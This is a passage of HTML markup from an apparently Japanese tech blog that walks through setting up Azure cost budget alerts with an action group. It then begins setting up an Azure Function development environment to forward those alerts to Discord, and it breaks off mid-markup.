    style=&quot;padding-bottom: 93.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAYAAACQjC21AAAACXBIWXMAAAsTAAALEwEAmpwYAAABsUlEQVQ4y6VU23KCQAzl/2fUJ8e/qo91fKgVRWFV7rBcPd2znaWIFe00M5EIyUmyJ1lrv99jZ9twHAe2em63n1gul1it3rFer1GWJSjX61XrM7H407btjdZ1jaZpbhxfAdOAaZoiyzKteZ6jKApUVQVxOmOz3cH1hE7Sr3JMrTAMEQQB4jjS7TW6ygZRKnH0E/iJ7KrrB/arvgEUwsPxeMRJCF3ZqzIE7Vpmi6bdKIrgKnDf9+F5HgJVPZOFWYkgbyDSGqe4UHaNUKr/SY1dVEOcAxVzQZIksJihTwjJMPbD6kikimtaoz/x1uVy0UQMhR9JGLOycmrMp6rajNI39JBlFcAW2bIBoriui9lshslkgvl8rnWxWGA6neJNzanxvWOZmX1VZRzHN7NH58PB0cnGSBnaVpalHbvDbExSFPLXb4/e6Tl8Ni5DgDE/y1G7vNl86MOXUmqlXVUlhLjfEgqPyba3ugOOHGMMUZYBMWtHm04EkjLvzrUPyF2nr1GC8V23y4bhZy0/uyR0y0T/jf5HBIxdErrCsjfUr15Ro9cX54wkPFr2PwOSALLWP/z/yBdXcM50i5aEDQAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/b7b89a2236b94726246b7d066f36df2e/8ac56/image-43.webp 240w,
/static/b7b89a2236b94726246b7d066f36df2e/d3be9/image-43.webp 480w,
/static/b7b89a2236b94726246b7d066f36df2e/3bfaf/image-43.webp 675w&quot;
              sizes=&quot;(max-width: 675px) 100vw, 675px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/b7b89a2236b94726246b7d066f36df2e/8ff5a/image-43.png 240w,
/static/b7b89a2236b94726246b7d066f36df2e/e85cb/image-43.png 480w,
/static/b7b89a2236b94726246b7d066f36df2e/23296/image-43.png 675w&quot;
            sizes=&quot;(max-width: 675px) 100vw, 675px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/b7b89a2236b94726246b7d066f36df2e/23296/image-43.png&quot;
            alt=&quot;image-43.png&quot;
            title=&quot;image-43.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;予算アラートを作成する際、このアクショングループをトリガーするように設定することで予算アラートの通知が実施されます。&lt;/p&gt;
&lt;p&gt;なお、アクショングループは予算アラート以外の通知にも使用することが可能です。&lt;/p&gt;
&lt;p&gt;また、オプションの設定ですが、アクショングループがトリガーされた際のアクションを追加で定義することもできます。&lt;/p&gt;
&lt;p&gt;これでFunctionなどを使用して任意の処理を行うことも可能です。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 526px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/4931463f553b1c5b1009acb2bdcc696a/2d7ab/image-44.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 90.41666666666666%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAAsTAAALEwEAmpwYAAABlklEQVQ4y6VU2Y6DMAzk/38PVtq+FVaqxBlycJQWvB7TVMBSsVUtWU6TeDx2hgZZllF8PlOSJHS5XCiJY4lfUURRFFIYhrJumoZg0zQ9fc8CetNeAT0BrbUE11pT27ZkODpnqe978aqqKM9zUhy7rlux3AVEK7gIUAD85JriVNH1OtDtdpNCAEXE+bbtJThiMAwDFUXBAFf6xDxogKplWVJd1zJ4a42wNcbIHphhH2sUds7JGVgrpSQumQtDJGB+/rIHw+W6VnKO5DRNpRjOMFcUgPeL2QaYEzZjlsvp9E33+/1PO2AJsKOWBbBjZpYZtcyiYYZgA3ePtdY1lUUudzAOxwydKMM8Hb+Rq7kbYQhJVDxHtIVWADaOo7DFSNAS7s0+LNbrvYEfNkCiSKOch4wBY+8dMa90iOSCWeFR4OM4rUAQfYE9/W1dADN5Pfdy0FvAQ4Y5/0FkWf747Jy0DravGB4CqodIoS/oTKmKmk8AwQoPg+93z94ChDTACAyNsfPzs1Tgfu3F/i9A35J3JG99+eJH9gsj+IFJkzbzlgAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/4931463f553b1c5b1009acb2bdcc696a/8ac56/image-44.webp 240w,
/static/4931463f553b1c5b1009acb2bdcc696a/d3be9/image-44.webp 480w,
/static/4931463f553b1c5b1009acb2bdcc696a/9752a/image-44.webp 526w&quot;
              sizes=&quot;(max-width: 526px) 100vw, 526px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/4931463f553b1c5b1009acb2bdcc696a/8ff5a/image-44.png 240w,
/static/4931463f553b1c5b1009acb2bdcc696a/e85cb/image-44.png 480w,
/static/4931463f553b1c5b1009acb2bdcc696a/2d7ab/image-44.png 526w&quot;
            sizes=&quot;(max-width: 526px) 100vw, 526px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/4931463f553b1c5b1009acb2bdcc696a/2d7ab/image-44.png&quot;
            alt=&quot;image-44.png&quot;
            title=&quot;image-44.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;予算アラートを作成する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E4%BA%88%E7%AE%97%E3%82%A2%E3%83%A9%E3%83%BC%E3%83%88%E3%82%92%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8B&quot; aria-label=&quot;予算アラートを作成する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;予算アラートを作成する&lt;/h3&gt;
&lt;p&gt;続いて、サブスクリプションページの「コストのアラート」から新しい予算アラートを作成します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 580px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/0a519d71cb664b869e28372f79e0e796/b6272/image-45.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 125%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAZCAYAAAAxFw7TAAAACXBIWXMAAAsTAAALEwEAmpwYAAACnklEQVQ4y61VaW/aQBT0r+u3SlWF0kuqqvzXfOZKlCCRFALEmMMXvrAN0zfPLDI0QJR2pdGaPWbfmze7WP1+Hzc3N+h02mi1Wri7u0NRFNhutwd4a7OiKEJZlvrjePMxqZk7d4C13WzgukvMZg7SNFU4jgPf9w82v5kwjDM82Uv0xzMEUYJMCF3XxWq1ejXlS+lbcZJgPJnA83wlcZyp9u5yidFohMVigfl8rlFT21NSmIMs/dgNbCT9Ok5tPEsYx7FGslqF+NdG0j0hUyKoH6ueiBRZlimq6EtNma7wPE97yhGGIZYiD/uqKPLRe3jAYDBAr9fDeDzGw/092q0m2u0Wms0mbm9v0e12xasd9SodsJaDqDVdQXL2SshTjdhsnPzx8xc+fPyMT40v+P7tK66urhSNRgPX19d7S72aMtNbr9cH4vpJgeEixtSLECepHFiqDIWAxTpneivPc42qGtSlWMYbjOcBBhMH/ZGDcvt3JKc8aR0vNDY6GL9gpTq5xWo+Pj7K1Zu92yp1yE2JYdu23pAgCLT8tBLtQxib+ALO85ugVbjuOG0rlQh931PfcQOtwMXPwyHmEnUgFeU1JDnHCY7Ts5yjQ0pBXuQqiVWkGUIhYqVN42bbftExY6s6WHGCBaUfuS5OIp2zNnS/RLWQk7mAbTqdYuZUzxnTYvSJ9HENOlYDM1PCUtg9Xredv9hoXPPwJqIxF1JbbizLQg/iWJome2RZWhWlkJDtlxd4QmIE5nNF4fk2UldGzkP5TbKVkDNNHso1vO9RtIvQRFX3GAk4ybFydzuMdvUxo2WF6n/IMk/+/2r6J/X76WlfAML8ab2LkAQTebKoGavLN85U7DCl8yjKSiKNMAoPX2t/Z2aSUvxLyNc50qxywB+iEI/Iq4fRmQAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/0a519d71cb664b869e28372f79e0e796/8ac56/image-45.webp 240w,
/static/0a519d71cb664b869e28372f79e0e796/d3be9/image-45.webp 480w,
/static/0a519d71cb664b869e28372f79e0e796/4fac6/image-45.webp 580w&quot;
              sizes=&quot;(max-width: 580px) 100vw, 580px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/0a519d71cb664b869e28372f79e0e796/8ff5a/image-45.png 240w,
/static/0a519d71cb664b869e28372f79e0e796/e85cb/image-45.png 480w,
/static/0a519d71cb664b869e28372f79e0e796/b6272/image-45.png 580w&quot;
            sizes=&quot;(max-width: 580px) 100vw, 580px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/0a519d71cb664b869e28372f79e0e796/b6272/image-45.png&quot;
            alt=&quot;image-45.png&quot;
            title=&quot;image-45.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;警告条件は、予算に対する割合として、予測値と実際値を設定可能です。&lt;/p&gt;
&lt;p&gt;今回は以下のように使用料の予測値が90%を超えたタイミングでのアラートを含む警告設定を行いました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 570px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/37ca5edb9753f4d17557b95aa724b1fd/432e7/image-46.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 83.33333333333334%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAAAsTAAALEwEAmpwYAAAB0UlEQVQ4y41Ua4/aMBD0//9Z16/oqNQPVBAS9SoCedlJICHv6Y57Sc0VpKy0yuJdj2fHXtS3tzd8326x2WywfX+HMQa0aZoevmtNVVWFcRzRdZ11176CrgFXdV2jKAo0TYNJgHOdQWfpAk6Q2deAqrIsbZsEzKsWu+CEH4dfqJvuv+JVDAmYZRlOpxMybRBeYpjiKmsaYRha15JfzXCUgr7vwdbZZitMu661MVk39nf3VM9ncqj4crEM19jfjdNLlhYwiWML6J7CW392ugv0leGcU9SobZulaBgGq+fvjw8rBe12u+EinbgtV9UNWmshk+J+v/9jmKaPCwSpBIC6kSmtbVtEUSR19cKG75d7+eRclmp+g5+IFtA9gEZwMlzqPlknSYxS9rsSqFg0dAGGJ4BkSEB3kgiYJgn47B4Az+ez3eBqSMA55ndmyDZdQK4Zox8v5egdsN/vEUmyLAsYEZqxkRGkZhSfcZpEMFmCQgA4nqzJc2PztRxUWi1HqMA/4uduB++wB+Pj0ZP4gKPnIQgC+L5v15jzmRcC1I5gJHC9lnIx+TJNKr520FWPMG/hxZWdlGEYbbu8IDpj119NC1dVP4pW4r28kHZY/9/3alr+ALPqLcAm8JNlAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/37ca5edb9753f4d17557b95aa724b1fd/8ac56/image-46.webp 240w,
/static/37ca5edb9753f4d17557b95aa724b1fd/d3be9/image-46.webp 480w,
/static/37ca5edb9753f4d17557b95aa724b1fd/048c8/image-46.webp 570w&quot;
              sizes=&quot;(max-width: 570px) 100vw, 570px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/37ca5edb9753f4d17557b95aa724b1fd/8ff5a/image-46.png 240w,
/static/37ca5edb9753f4d17557b95aa724b1fd/e85cb/image-46.png 480w,
/static/37ca5edb9753f4d17557b95aa724b1fd/432e7/image-46.png 570w&quot;
            sizes=&quot;(max-width: 570px) 100vw, 570px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/37ca5edb9753f4d17557b95aa724b1fd/432e7/image-46.png&quot;
            alt=&quot;image-46.png&quot;
            title=&quot;image-46.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;これでコストのアラート通知設定は完了です。&lt;/p&gt;
&lt;p&gt;Azure APIとかを使いこなせば、アクショングループからアラートが出た際にすべてのリソースを停止するような処理を自動化することも可能かもしれませんね。&lt;/p&gt;
&lt;h2 id=&quot;おまけazure-function-で-discord-に通知を転送する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%8A%E3%81%BE%E3%81%91azure-function-%E3%81%A7-discord-%E3%81%AB%E9%80%9A%E7%9F%A5%E3%82%92%E8%BB%A2%E9%80%81%E3%81%99%E3%82%8B&quot; aria-label=&quot;おまけazure function で discord に通知を転送する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;おまけ：Azure Function で Discord に通知を転送する&lt;/h2&gt;
&lt;p&gt;「Azure Function(日本語UIだと関数アプリ)」はサーバレスにアプリケーションを実行できるサービスです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/azure/azure-functions/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Azure Functions documentation | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;「関数アプリ」から新規のFunctionを作成します。&lt;/p&gt;
&lt;p&gt;ランタイムはPythonに設定しました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 675px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/f8a1e1c611fc006ffe00700b9be4ec56/23296/image-47.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 90.83333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAAsTAAALEwEAmpwYAAACYklEQVQ4y5VU227TQBD1F6d8C4g/oBKlNEFCUC5PUPUTgCQkJKlyt+PLrq/ry2FmHCemaQWMdLTr1Xj2zJljWyvbw3TlYLxRcFwfodaoquqv4Gjvm7AGgz5+fP8Gd2djPB4J/iUeu8RqEsqyPCQXRSHgM17zPN+vBsZkyI15kCHvrbXjSataK6RpSqvGbreD71P7YShQSklBPt9sNnLWjmJ/oTB0nB1m0ykWiznm8znGoxHu7u5g2za2262cNc/L5RLLxYJyF5hMJiTPWPbr9RpBENQF+TZOnM1mwiBJEkRRJGx55UQGM4/jWFYG54X7s7aOxNDBcDjEoN8XRpzMN3qed9CHX27rxO010kREiC+UnGrPkIsGpJnJsj+0ubn5isvXl+i96eGqe4Vur4uLi5cYkROIDzIakBEYKlgztXiC3BoXjmllgRtmt19u0X3Vw4d3H/Hp+rPg/dtr/Po5QawTBK6C8rTAc3xxhdW2CtuhpLUpuHRz+Lo4NSE5LE/JWllZg/YmqYlYGbXpk16r1UoEbnTiMHzJ3od5QdYo9/6syge/Epkyi8+j91xX2m0XfP7sKZ6cnaHT6eD8xflhQOyABooG4ns++darW2aG7WEcv1PAVrEY3vVcMTcP4X6IlUJ9HAoPRJKpaNV8ftwOLbYbIQ5jpEmGSNf7wpQo8yOqsta0NLUMFo9cTEuF238RDp/+RMrVyGKDLDJIowyJTk8QKzK5T++XVJB14GL3W+YIvAChIjuFyQFJdAo+D1XUtBwiaU2X6x0YOvSPXO2EXZ6QNeL8USQ6qxmeMqtOmP5P/AaSOmvFj/yEAAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/f8a1e1c611fc006ffe00700b9be4ec56/8ac56/image-47.webp 240w,
/static/f8a1e1c611fc006ffe00700b9be4ec56/d3be9/image-47.webp 480w,
/static/f8a1e1c611fc006ffe00700b9be4ec56/3bfaf/image-47.webp 675w&quot;
              sizes=&quot;(max-width: 675px) 100vw, 675px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/f8a1e1c611fc006ffe00700b9be4ec56/8ff5a/image-47.png 240w,
/static/f8a1e1c611fc006ffe00700b9be4ec56/e85cb/image-47.png 480w,
/static/f8a1e1c611fc006ffe00700b9be4ec56/23296/image-47.png 675w&quot;
            sizes=&quot;(max-width: 675px) 100vw, 675px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/f8a1e1c611fc006ffe00700b9be4ec56/23296/image-47.png&quot;
            alt=&quot;image-47.png&quot;
            title=&quot;image-47.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;開発環境を構築する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E9%96%8B%E7%99%BA%E7%92%B0%E5%A2%83%E3%82%92%E6%A7%8B%E7%AF%89%E3%81%99%E3%82%8B&quot; aria-label=&quot;開発環境を構築する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;開発環境を構築する&lt;/h3&gt;
&lt;p&gt;Azure FunctionはローカルホストからVSCodeもしくは任意のエディタを使用して開発を行います。&lt;/p&gt;
&lt;p&gt;AWS LambdaのようにWEBエディタからの編集は出来なさそうです。&lt;/p&gt;
&lt;p&gt;続いて、ローカルホスト(Windows)で以下のコマンドを実行してコアツールをインストールします。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;npm install &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;g azure-functions-core-tools@3 &lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;unsafe-perm true&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;※ Nodeをインストールしていない環境でも、以下のドキュメントの手順でインストールが可能です。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/azure/azure-functions/functions-run-local?tabs=v4%2Cwindows%2Ccsharp%2Cportal%2Cbash#install-the-azure-functions-core-tools&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Azure Functions Core Tools の操作 | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;続いて、今回はVSCodeで開発を行うので、以下のVSCode拡張をインストールしました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/2018b4be8fb0e8abe8aa6804e8d43882/0b533/image-48.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 112.91666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAXCAYAAAALHW+jAAAACXBIWXMAARlAAAEZQAGA43XUAAADkUlEQVQ4y31VS5LjRBT0HYihsSVZ1v///zVty3ID3UBATPSGCGbBgg0RBCuuwVnmAnO6JF9Z8tjdAYtnVcmqrHyZ71WtiqJEnhcoihyun8N2fNi2g93OgmXZDOsytm0bjuPAdT2Gy/HnSNMMnudjpesGDG2NL+80fHi/QRF/BdtyUTc1irJU0TQtsixDFMewXR8bTYNhGNhut5eQucTK1Dd451Z4fnnEp3/ewR2fYacDDocRTUXmeYah79F1PcrYwUOio0x8uGSzgF6Dr8z1He6qE3796xd8/PsL5B9+h5UPSOsBiUTzNZKsQBSFiMMARRohS1P4vg+dTPWZ2QVQfjaajrYOkMc2NqJXUiN+/weSH39D8vIn0m6PwKdWohv1Ex2XEF2vWa6WyXq9hkZgQ9tAM7bIs5zpptRzpwwIw5CieyqEXRAECPhOxjeAuq6rj5q65p8eYgofRZEyQRjIQpkLE/lPQmW14cZX5pxNIaAMZGEcxYqJ2pkREkQ2WgDVOzJKkuTyXtZdu6wYyi6yYJomtG2Lmkx7ulpVFeszp7sdy6bB/f29ep7BQlV3wtq4MkWVjaQszIZhUE+ZLx+pGlUfG5d3pmkS0EcU+jCvmL3RUNiU7JaqKsmyQsWCrjkWbYuiUIyXDR2PMuSd6iqD8+sCV4ABnWraDnHeIClaRFnNZ4ek7NkptQIrGeLq1tCwDRqYxfcwLI9zZvQaUKyXFtNMB9rWPod5jq1pwZl7WFwUANNNsIt6bO3wc8qLhmKKVP7xOKG6P2E8HHCajnh8PGE6jsqscRyVIcJ0t9spDcuyUFKJpjcpG7MmbTfQ3U6ZIy4PQ39+0l1xWOpSXFUSSSmxHmUTKaXb1tPZj3aAw+N3OJ0mBlmOewz7CQ+HI8EG7Pd7FVKDApgkKQ0sybJUx5s+G6NSNqiJxfOsrGqVeklH8yxGmJTwwxgenV1233GxLBK3pWMyVoZs4jP1S9nIQFKR3fL5A0mvFmf5TnQTQ4TJArzU6tLXouvN4aDNtdi2jeqWnGegNx8AMbtIji7R6nrhAryAX1JeABMCTscaOQ/VjG0l7aX6mc9Lf4fRG9A3vbzsJNQPhz1TrOnsA1KmnRFwLFOVdsZ7J6XG1qzja8CbA3bp575nyXQtXn7+Bk/PP+DbwwN+GqT9WIN1i+enJ6Wn/qrd/hNQatDnXRF4zpwyLyXbVbegx5Nabkgp5P9j+C+9UJ5/fN6zygAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/2018b4be8fb0e8abe8aa6804e8d43882/8ac56/image-48.webp 240w,
/static/2018b4be8fb0e8abe8aa6804e8d43882/d3be9/image-48.webp 480w,
/static/2018b4be8fb0e8abe8aa6804e8d43882/b0a15/image-48.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/2018b4be8fb0e8abe8aa6804e8d43882/8ff5a/image-48.png 240w,
/static/2018b4be8fb0e8abe8aa6804e8d43882/e85cb/image-48.png 480w,
/static/2018b4be8fb0e8abe8aa6804e8d43882/0b533/image-48.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/2018b4be8fb0e8abe8aa6804e8d43882/0b533/image-48.png&quot;
            alt=&quot;image-48.png&quot;
            title=&quot;image-48.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;拡張機能がインストールできたら、&lt;code class=&quot;language-text&quot;&gt;Signin to Azure&lt;/code&gt;を選択してVSCodeからAzureにログインします。&lt;/p&gt;
&lt;p&gt;すると、VSCodeにサブスクリプションが表示され、先ほど作成したFunctionが表示されました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 378px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/7726f6ca0421e76c00e3643b84f6fbc3/f0991/image-49.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
